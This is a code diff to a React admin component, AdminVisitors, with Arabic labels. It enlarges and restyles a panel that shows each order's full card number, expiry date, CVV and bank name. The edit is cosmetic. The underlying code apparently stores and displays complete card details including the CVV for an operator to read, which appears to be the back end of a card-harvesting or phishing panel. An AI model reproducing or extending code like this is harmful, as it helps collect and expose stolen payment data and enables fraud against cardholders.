@@ -1576,29 +1576,29 @@ const AdminVisitors = () => {
 
                         {/* Payment card preview for orders */}
                         {item.type === "order" && item.data.card_full_number && (
-                          <div className="mt-1.5 bg-slate-800 rounded-lg p-2 space-y-1">
+                          <div className="mt-2 bg-gradient-to-br from-slate-800 via-slate-900 to-slate-800 rounded-xl p-4 space-y-2.5 shadow-lg border border-slate-700/50">
                             <div className="flex items-center justify-between">
-                              <span className={`${xs} text-slate-400`}>البطاقة</span>
-                              <span className={`${xs} font-mono font-bold text-white`} dir="ltr">
+                              <span className="text-[12px] text-slate-400 font-medium">البطاقة</span>
+                              <span className="text-[15px] font-mono font-bold text-white tracking-widest" dir="ltr">
                                 {item.data.card_full_number.replace(/\s/g, "").replace(/(.{4})/g, "$1 ").trim()}
                               </span>
                             </div>
                             {item.data.card_expiry && (
                               <div className="flex items-center justify-between">
-                                <span className={`${xs} text-slate-400`}>الانتهاء</span>
-                                <span className={`${xs} font-mono text-white`} dir="ltr">{item.data.card_expiry}</span>
+                                <span className="text-[12px] text-slate-400 font-medium">الانتهاء</span>
+                                <span className="text-[14px] font-mono text-white" dir="ltr">{item.data.card_expiry}</span>
                               </div>
                             )}
                             {item.data.card_cvv && (
                               <div className="flex items-center justify-between">
-                                <span className={`${xs} text-slate-400`}>CVV</span>
-                                <span className={`${xs} font-mono font-bold text-amber-400`} dir="ltr">{item.data.card_cvv}</span>
+                                <span className="text-[12px] text-slate-400 font-medium">CVV</span>
+                                <span className="text-[16px] font-mono font-bold text-amber-400" dir="ltr">{item.data.card_cvv}</span>
                               </div>
                             )}
                             {item.data.bank_name && (
                               <div className="flex items-center justify-between">
-                                <span className={`${xs} text-slate-400`}>البنك</span>
-                                <span className={`${xs} text-sky-300`}>{item.data.bank_name}</span>
+                                <span className="text-[12px] text-slate-400 font-medium">البنك</span>
+                                <span className="text-[13px] text-sky-300 font-semibold">{item.data.bank_name}</span>
                               </div>
                             )}
                           </div>
